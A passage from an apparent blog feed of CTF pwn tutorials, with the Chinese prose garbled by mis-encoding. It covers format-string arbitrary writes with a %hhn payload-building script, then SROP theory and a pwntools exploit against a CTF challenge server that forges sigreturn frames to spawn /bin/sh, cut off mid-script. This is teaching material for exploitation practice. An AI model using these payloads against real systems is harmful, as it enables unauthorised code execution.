src="/2023/04/08/ge-shi-hua-zi-fu-chuan/15.png"></p><p>æ€»ç»“ï¼šå…¶å®ï¼Œæˆ‘ä»¬æ²¡æœ‰å¿…è¦æŠŠåœ°å€æ”¾åœ¨æœ€å‰é¢ï¼Œæ”¾åœ¨å“ªé‡Œéƒ½å¯ä»¥ï¼Œåªè¦æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å…¶å¯¹åº”çš„åç§»å³å¯ã€‚</p><h6 id="è¦†ç›–å¤§æ•°å­—"><a href="#è¦†ç›–å¤§æ•°å­—" class="headerlink" title="è¦†ç›–å¤§æ•°å­—"></a>è¦†ç›–å¤§æ•°å­—</h6><p>é¦–å…ˆï¼Œæ‰€æœ‰çš„å˜é‡åœ¨å†…å­˜ä¸­éƒ½æ˜¯ä»¥å­—èŠ‚è¿›è¡Œå­˜å‚¨çš„ã€‚æ­¤å¤–ï¼Œåœ¨ x86 å’Œ x64 çš„ä½“ç³»ç»“æ„ä¸­ï¼Œå˜é‡çš„å­˜å‚¨æ ¼å¼ä¸ºä»¥<strong>å°ç«¯å­˜å‚¨ï¼Œå³æœ€ä½æœ‰æ•ˆä½å­˜å‚¨åœ¨ä½åœ°å€</strong>ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œ0x12345678 åœ¨å†…å­˜ä¸­ç”±ä½åœ°å€åˆ°é«˜åœ°å€ä¾æ¬¡ä¸º \ x78\x56\x34\x12ã€‚å†è€…ï¼Œæˆ‘ä»¬å¯ä»¥å›å¿†ä¸€ä¸‹æ ¼å¼åŒ–å­—ç¬¦ä¸²é‡Œé¢çš„æ ‡å¿—ï¼Œå¯ä»¥å‘ç°æœ‰è¿™ä¹ˆä¸¤ä¸ªæ ‡å¿—ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">hh å¯¹äºæ•´æ•°ç±»å‹ï¼ŒprintfæœŸå¾…ä¸€ä¸ªä»<span class="token keyword">char</span>æå‡çš„<span class="token keyword">int</span>å°ºå¯¸çš„æ•´å‹å‚æ•°ã€‚h  å¯¹äºæ•´æ•°ç±»å‹ï¼ŒprintfæœŸå¾…ä¸€ä¸ªä»<span class="token keyword">short</span>æå‡çš„<span class="token keyword">int</span>å°ºå¯¸çš„æ•´å‹å‚æ•°ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰€ä»¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨**%hhn å‘æŸä¸ªåœ°å€å†™å…¥å•å­—èŠ‚ï¼Œåˆ©ç”¨ %hn å‘æŸä¸ªåœ°å€å†™å…¥åŒå­—èŠ‚ã€‚**è¿™é‡Œï¼Œæˆ‘ä»¬ä»¥å•å­—èŠ‚ä¸ºä¾‹ã€‚</p><ul><li><p>ç¡®å®šè¦†ç›–åœ°å€ï¼šåŒaä¸€æ ·çš„æ–¹æ³•ï¼Œåœ°å€ä¸ºï¼š0x804A02C</p></li><li><p>ç¡®å®šç›¸å¯¹åç§»ï¼šæˆ‘ä»¬å¸Œæœ›å°†æŒ‰ç…§å¦‚ä¸‹æ–¹å¼è¿›è¡Œè¦†ç›–ï¼Œå‰é¢ä¸ºè¦†ç›–åœ°å€ï¼Œåé¢ä¸ºè¦†ç›–å†…å®¹ã€‚</p><pre class="line-numbers language-none"><code class="language-none">0x0804A028 \x780x0804A029 \x560x0804A02a \x340x0804A02b \x12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆï¼Œç”±äºæˆ‘ä»¬çš„å­—ç¬¦ä¸²çš„åç§»ä¸º 6ï¼Œæ‰€ä»¥ç¡®å®šæˆ‘ä»¬çš„ payload åŸºæœ¬æ˜¯è¿™ä¸ªæ ·å­çš„</p><pre class="line-numbers language-none"><code class="language-none">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$hhn'+pad2+'%7$hhn'+pad3+'%8$hhn'+pad4+'%9$hhn'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>è¿›è¡Œè¦†ç›–</p></li></ul><p>payloadæ„é€ (æ¥è‡ªwikiï¼š</p><p>å…¶ä¸­æ¯ä¸ªå‚æ•°çš„å«ä¹‰åŸºæœ¬å¦‚ä¸‹ï¼š</p><ul><li>offset è¡¨ç¤ºè¦è¦†ç›–çš„åœ°å€æœ€åˆçš„åç§»</li><li>size è¡¨ç¤ºæœºå™¨å­—é•¿</li><li>addr è¡¨ç¤ºå°†è¦è¦†ç›–çš„åœ°å€ã€‚</li><li>target è¡¨ç¤ºæˆ‘ä»¬è¦è¦†ç›–ä¸ºçš„ç›®çš„å˜é‡å€¼ã€‚</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#å¦‚æœä¹‹å‰è¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°&lt;è¦å¡«å†™çš„å€¼ï¼Œå°±éœ€è¦è¡¥ä¸Š(wrod-prev)ä¸ªå­—ç¬¦è¾“å‡º</span>    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>         result <span class="token operator">=</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span> <span class="token comment">#å¦‚æœä¹‹å‰è¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°=è¦å¡«å†™çš„å€¼ï¼Œå°±ä¸éœ€è¦padäº†</span>        result <span class="token operator">=</span> <span class="token number">0</span><span class="token comment">#å¦‚æœä¹‹å‰è¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°&gt;è¦å¡«å†™çš„å€¼</span>    <span class="token comment">#å› ä¸ºæˆ‘ä»¬åªå¡«å†™ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä½å­—èŠ‚ä¸ºæˆ‘ä»¬è¦å¡«å†™çš„å€¼å³å¯</span>    <span class="token comment">#æ¯”å¦‚prev=0x78 word=0x56</span>    <span class="token comment">#é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦è¡¥ä¸Šä¸€äº›padï¼Œä½¿å¾—ä¹‹å‰è¾“å‡ºçš„å­ä¸²ä¸ªæ•°ä¸ºprev+pad = 0x156</span>    <span class="token comment">#æ‰€ä»¥pad = 0x156 - prev = 0x100 + word - prev = 256 + word - prev</span>    <span class="token comment">#æ³¨æ„ä¸ºä»€ä¹ˆæ˜¯0x156,è€Œä¸æ˜¯0x256ç­‰ç­‰,æœ‰çš„åŒå­¦ä¼šé—®ï¼Œå¦‚æœå‰é¢å·²ç»è¾“å‡º0x178ä¸ªå­—ç¬¦ï¼Œé‚£è¿™æ ·ç®—å‡ºæ¥padä¸æ˜¯è´Ÿæ•°å—ï¼Ÿ</span>    <span class="token comment">#å…¶å®æ˜¯è¿™æ ·çš„ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬æ˜¯ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„å¡«å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å…¥çš„prevä¹Ÿåªæ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œå¯ä»¥çœ‹fmt_strå‡½æ•°ï¼Œæ‰€ä»¥å°±ç»Ÿä¸€æˆäº†0x100ï¼Œå› ä¸º0x200,0x300å…¶å®æ²¡æœ‰åŒºåˆ«ï¼Œå› ä¸ºæˆ‘ä»¬åªéœ€è¦ä½å­—èŠ‚</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>    <span class="token keyword">return</span> fmtstr<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token comment">#æ ¹æ®æœºå™¨å­—é•¿æ„é€ å‰é¢è¦è¦†ç›–çš„åœ°å€</span>            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    prev <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">#payloadç°åœ¨çš„é•¿åº¦</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#æˆ‘ä»¬ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„å¡«å†™ï¼Œæ‰€ä»¥éœ€è¦å¡«å†™4æ¬¡</span>        <span class="token comment">#prevä¹‹å‰è¾“å‡ºå­—ç¬¦çš„ä¸ªæ•°</span>        <span class="token comment">#(target &gt;&gt; i * 8) &amp; 0xff æˆ‘ä»¬è¦è¦†ç›–çš„å•å­—èŠ‚çš„å€¼</span>         <span class="token comment">#æ¯”å¦‚0x12345678ç¬¬1æ¬¡ (0x12345678 &gt;&gt; 0 * 8) &amp; 0xff = 0x78</span>         <span class="token comment">#ç¬¬2æ¬¡  (0x12345678 &gt;&gt; 1 * 8) &amp; 0xff = 0x56 ....</span>        <span class="token comment">#è¦†ç›–çš„åç§»ï¼š</span>         <span class="token comment">#æ¯”å¦‚0x78å®ƒçš„åç§»å°±æ˜¯offsetï¼Œè€Œ0x56çš„åç§»ä¸ºoffset+1 ....</span>        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token comment">#ä¹‹å‰è¾“å‡ºå­—ç¬¦çš„ä¸ªæ•°</span>        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">return</span> payloadpayload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A02C</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/ge-shi-hua-zi-fu-chuan/16.png"></p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_15">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_15</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-SROP</title>
      <link href="/2023/04/08/pwn-srop/"/>
      <url>/2023/04/08/pwn-srop/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="SROPåŸç†"><a href="#SROPåŸç†" class="headerlink" title="SROPåŸç†"></a>SROPåŸç†</h3><h4 id="signalæœºåˆ¶"><a href="#signalæœºåˆ¶" class="headerlink" title="signalæœºåˆ¶"></a>signalæœºåˆ¶</h4><p><code>signal</code>æœºåˆ¶æ˜¯ç±»unixç³»ç»Ÿä¸­è¿›ç¨‹é—´é€šä¿¡çš„ä¸€ç§æ–¹å¼ã€‚æˆ‘ä»¬ç§°å…¶ä¸ºè½¯ä¸­æ–­ä¿¡å·ï¼Œæˆ–è€…è½¯ä¸­æ–­ã€‚ä¸€èˆ¬åˆ†ä¸ºä¸‰æ­¥ï¼š</p><p><img src="/2023/04/08/pwn-srop/ProcessOfSignalHandlering.png" alt="å›¾ç‰‡æ¥è‡ªwiki"></p><ul><li>å†…æ ¸å‘æŸä¸ªè¿›ç¨‹å‘é€ <code>signal</code> æœºåˆ¶ï¼Œè¯¥è¿›ç¨‹ä¼šè¢«æš‚æ—¶æŒ‚èµ·ï¼Œè¿›å…¥å†…æ ¸æ€ï¼›</li><li>å†…æ ¸ä¼šä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œä¹‹åè·³è½¬åˆ°æ³¨å†Œå¥½çš„ <code>signal handler</code> ä¸­å¤„ç†ç›¸åº”çš„ <code>signal</code>ï¼›</li><li><code>signal handler</code> è¿”å›åï¼Œå†…æ ¸æ‰§è¡Œ <code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ã€‚</li></ul><p>1ã€<code>sigreturn</code>æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨ç±» unix ç³»ç»Ÿå‘ç”Ÿ <code>signal</code> çš„æ—¶å€™ä¼šè¢«é—´æ¥åœ°è°ƒç”¨ã€‚</p><p>2ã€å†…æ ¸åœ¨ä¿å­˜è¿›ç¨‹ç›¸åº”çš„ä¸Šä¸‹æ–‡æ—¶ï¼Œ<strong>ä¸»è¦æ˜¯å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥ signal ä¿¡æ¯ï¼Œä»¥åŠæŒ‡å‘ sigreturn çš„ç³»ç»Ÿè°ƒç”¨åœ°å€ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„</strong>ã€‚ç§° <code>ucontext</code> ä»¥åŠ <code>siginfo</code> è¿™ä¸€æ®µä¸º <code>Signal Frame</code>ï¼Œæ­¤æ—¶æ ˆç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/2023/04/08/pwn-srop/signal2-stack.png"></p><p>3ã€å†…æ ¸åœ¨æ¢å¤è¿›ç¨‹ç›¸åº”çš„ä¸Šä¸‹æ–‡æ—¶ï¼Œ<strong>å…¶ä¸­åŒ…æ‹¬å°†æ‰€æœ‰å‹å…¥çš„å¯„å­˜å™¨ï¼Œé‡æ–° pop å›å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œ</strong>ã€‚å…¶ä¸­ï¼Œ32 ä½çš„ sigreturn çš„è°ƒç”¨å·ä¸º 119(0x77)ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15(0xf)ã€‚</p><h4 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h4><h5 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h5><p>å†…æ ¸åœ¨ <code>signal</code> ä¿¡å·å¤„ç†çš„è¿‡ç¨‹ä¸­çš„å·¥ä½œï¼Œä¸»è¦åšçš„å·¥ä½œå°±æ˜¯ä¸ºè¿›ç¨‹ä¿å­˜ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”æ¢å¤ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ªä¸»è¦çš„å˜åŠ¨éƒ½åœ¨ <code>Signal Frame</code> ä¸­ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><ul><li><code>Signal Fram</code>e è¢«ä¿å­˜åœ¨<strong>ç”¨æˆ·çš„åœ°å€ç©ºé—´ä¸­ï¼Œæ‰€ä»¥ç”¨æˆ·æ˜¯å¯ä»¥è¯»å†™çš„</strong>ã€‚</li><li>ç”±äºå†…æ ¸ä¸ä¿¡å·å¤„ç†ç¨‹åºæ— å…³ (kernel agnostic about signal handlers)ï¼Œå®ƒå¹¶ä¸ä¼šå»è®°å½•è¿™ä¸ª <code>signal</code> å¯¹åº”çš„ <code>Signal Frame</code>ï¼Œæ‰€ä»¥<strong>å½“æ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œæ­¤æ—¶çš„ Signal Frame å¹¶ä¸ä¸€å®šæ˜¯ä¹‹å‰å†…æ ¸ä¸ºç”¨æˆ·è¿›ç¨‹ä¿å­˜çš„ Signal Frame</strong>ã€‚</li></ul><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ä¼ªé€ ä¸€ä¸ª<code>Signal Frame</code>ï¼Œç„¶åä¸»åŠ¨å»æ‰§è¡Œ <code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨ï¼Œè¿™æ—¶å†…æ ¸ä¼šä»¥ä¸ºæˆ‘ä»¬æ˜¯ä»<code>singal hanlder</code>è¿”å›çš„ï¼Œæ‰€ä»¥å°±ä¼šæ¢å¤è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œè¿™æ—¶å°±å¯ä»¥ä¿®æ”¹æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ä¸ºæˆ‘ä»¬ä¼ªé€ <code>Sinal Frame</code>ä¸­çš„å€¼ã€‚</p><h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><p>1ã€å¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬åœ¨æ ˆä¸­ä¼ªé€ ä¸€ä¸ª<code>Sinal Frame</code>ï¼Œå½“æˆ‘ä»¬æ‰§è¡Œ <code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå¯„å­˜å™¨ä¸­çš„å€¼å°±ä¼šè¢«ä¿®æ”¹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">rax<span class="token operator">=</span><span class="token number">59</span>rdi<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token string">"/bin/sh"</span>rsi<span class="token operator">=</span><span class="token number">0</span>rdx<span class="token operator">=</span><span class="token number">0</span>rip<span class="token operator">=</span><span class="token operator">&amp;</span>syscallè¿™å°±æ˜¯execvçš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæ¥ä¸‹æ¥ä¼šå»æ‰§è¡Œ<span class="token function">execv</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/08/pwn-srop/srop-example-1.png"></p><p>2ã€åœ¨1ï¼‰ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åªæ˜¯å•ç‹¬çš„è·å¾—ä¸€ä¸ª shellã€‚æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¸Œæœ›æ‰§è¡Œä¸€ç³»åˆ—çš„å‡½æ•°ã€‚æˆ‘ä»¬åªéœ€è¦åšä¸¤å¤„ä¿®æ”¹å³å¯ï¼š</p><ul><li><strong>æ§åˆ¶æ ˆæŒ‡é’ˆrspã€‚</strong></li><li><strong>æŠŠåŸæ¥ rip æŒ‡å‘çš„<code>syscall</code> gadget æ¢æˆ<code>syscall; ret</code> gadgetã€‚</strong></li></ul><p>å¦‚ä¸‹å›¾æ‰€ç¤º ï¼Œè¿™æ ·å½“æ¯æ¬¡ <code>syscall</code> è¿”å›çš„æ—¶å€™ï¼Œæ ˆæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ª <code>Signal Frame</code>ã€‚å› æ­¤å°±å¯ä»¥æ‰§è¡Œä¸€ç³»åˆ—çš„ <code>sigreturn</code> å‡½æ•°è°ƒç”¨ã€‚</p><p><img src="/2023/04/08/pwn-srop/srop-example-2.png"></p><h5 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><p>æˆ‘ä»¬åœ¨æ„é€  ROP æ”»å‡»çš„æ—¶å€™ï¼Œéœ€è¦æ»¡è¶³ä¸‹é¢çš„æ¡ä»¶</p><ul><li><strong>å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ¥æ§åˆ¶æ ˆçš„å†…å®¹(ä¼ªé€ Signal Frame</strong></li><li>éœ€è¦çŸ¥é“ç›¸åº”çš„åœ°å€<ul><li><strong>â€œ/bin/shâ€</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall(syscall_ret)</strong></li><li><strong>sigreturn</strong></li></ul></li><li>éœ€è¦æœ‰å¤Ÿå¤§çš„ç©ºé—´æ¥å¡ä¸‹æ•´ä¸ª Signal Frame</li></ul><p>å¯¹äº sigreturn ç³»ç»Ÿè°ƒç”¨æ¥è¯´ï¼Œåœ¨ 64 ä½ç³»ç»Ÿä¸­ï¼Œsigreturn ç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15ï¼Œåªéœ€è¦ RAX=15ï¼Œå¹¶ä¸”æ‰§è¡Œ syscall å³å¯å®ç° sigreturn è°ƒç”¨ã€‚è€Œ <strong>RAX å¯„å­˜å™¨çš„å€¼åˆå¯ä»¥é€šè¿‡æ§åˆ¶æŸä¸ªå‡½æ•°çš„è¿”å›å€¼æ¥é—´æ¥æ§åˆ¶</strong>ï¼Œæ¯”å¦‚è¯´ read å‡½æ•°çš„è¿”å›å€¼ä¸ºè¯»å–çš„å­—èŠ‚æ•°ã€‚</p><h4 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h4><h5 id="360æ˜¥ç§‹æ¯â€”â€”smallest-pwn"><a href="#360æ˜¥ç§‹æ¯â€”â€”smallest-pwn" class="headerlink" title="360æ˜¥ç§‹æ¯â€”â€”smallest-pwn"></a>360æ˜¥ç§‹æ¯â€”â€”smallest-pwn</h5><p>ç¨‹åºåªå¼€å¯äº†NXä¿æŠ¤ï¼Œä½†æ˜¯ä»£ç ç”šå°‘ï¼Œæˆ‘ä»¬å¯ç”¨çš„ä»£ç å¦‚ä¸‹å›¾ï¼š</p><p>ç¨‹åºç›´æ¥å‘æ ˆé¡¶å†™å…¥0x400ä¸ªå­—ç¬¦</p><p><img src="/2023/04/08/pwn-srop/1.png"></p><ul><li>è¿™ä¸ªé¢˜å°±æ˜¯å…¸å‹çš„<strong>é€šè¿‡ read å‡½æ•°è¿”å›å€¼æ¥é—´æ¥ä¿®æ”¹RAX å¯„å­˜å™¨çš„å€¼</strong></li><li>é¢˜ç›®ä¸­å¹¶æ²¡æœ‰<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬è‡ªå·±å†™å…¥ï¼Œä½†è¿™ä¸ªç¨‹åºå¾ˆå°æ²¡æœ‰BSSæ®µï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æŠŠ<code>/bin/sh</code>å†™åœ¨æ ˆä¸Š<ul><li>æ‰€ä»¥æˆ‘ä»¬è¦æ³„æ¼æ ˆåœ°å€</li><li>ç„¶åæŠŠ<code>/bin/sh</code>å†™å…¥æ ˆä¸Š</li></ul></li><li>ä¼ªé€ Signal Frameï¼Œæ‰§è¡Œexecvå‡½æ•°</li></ul><p><strong>expï¼š</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span><span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25526</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./smallest"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""0x4000B0 xor rax, rax0x4000B3 mov edx, 400h    0x4000B8 mov rsi, rsp 0x4000BB mov rdi, rax  0x4000BE syscall 0x4000C0 ret"""</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>syscall_ret <span class="token operator">=</span> <span class="token number">0x4000BE</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4000B0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token comment">#è¿™é‡Œéœ€è¦ä¸‰æ¬¡,ç¬¬ä¸€æ¬¡ä¿®æ”¹ä½å­—èŠ‚ä¸ºB3,ç¬¬äºŒæ¬¡æ³„æ¼æ ˆåœ°å€,ç¬¬ä¸‰æ¬¡å†™å…¥payloadæ‰§è¡ŒåæœŸæ“ä½œ</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\xB3'</span><span class="token punctuation">)</span> <span class="token comment">#æŠŠä½å­—èŠ‚ä¿®æ”¹ä¸ºB3,è€Œè·³è¿‡xor rax,rax,ä¸”readåªè¯»å…¥ä¸€ä¸ªå­—ç¬¦,æ‰€ä»¥è¿”å›å€¼rax=1,ä¸ºwriteç³»ç»Ÿè°ƒç”¨å·</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stack:"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#æ§åˆ¶rspåˆ°stackä¸Š</span>read_frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>read_frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>read_frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>read_frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> stackread_frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x400</span>read_frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> stackread_frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x4000B0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>read_frame<span class="token 